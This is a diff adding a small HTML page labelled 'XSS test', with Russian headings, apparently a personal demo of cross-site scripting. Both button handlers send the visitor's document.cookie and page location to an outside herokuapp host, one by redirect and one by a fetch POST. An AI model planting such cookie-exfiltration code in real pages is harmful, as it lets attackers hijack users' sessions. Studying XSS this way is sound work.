@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>XSS test</title>
+</head>
+<body>
+<h3>XSS - через смену document.location</h3>
+<form method="get">
+    <button id="xss" >Отправить</button>
+</form>
+
+<h3>XSS - через ajax</h3>
+<form method="get">
+    <button id="xss-by-ajax">Отправить</button>
+</form>
+
+</body>
+<script>
+    document.getElementById('xss').addEventListener('click', xssListener);
+    document.getElementById('xss-by-ajax').addEventListener('click', xssByAjaxListener);
+
+    function xssListener(e) {
+        e.preventDefault();
+        let docLoc = document.location;
+        document.location = "https://gasymovrv-libmvc.herokuapp.com/xss?location="+encodeURIComponent(docLoc)+"&data="+encodeURIComponent(document.cookie);
+        console.log(localStorage);
+    }
+
+    function xssByAjaxListener(e) {
+        e.preventDefault();
+        let xssData = {
+            location: document.location,
+            data: document.cookie
+        };
+        let options = {
+            method: 'POST',//тип запроса
+            headers: {
+                'Content-Type': 'application/json', //отправляемый тип
+            },
+            body: JSON.stringify(xssData)//отправляемое отсюда (Request)
+        };
+        fetch(`https://gasymovrv-libmvc.herokuapp.com/xss-by-ajax`, options);
+        console.log(localStorage);
+    }
+</script>
+</html>
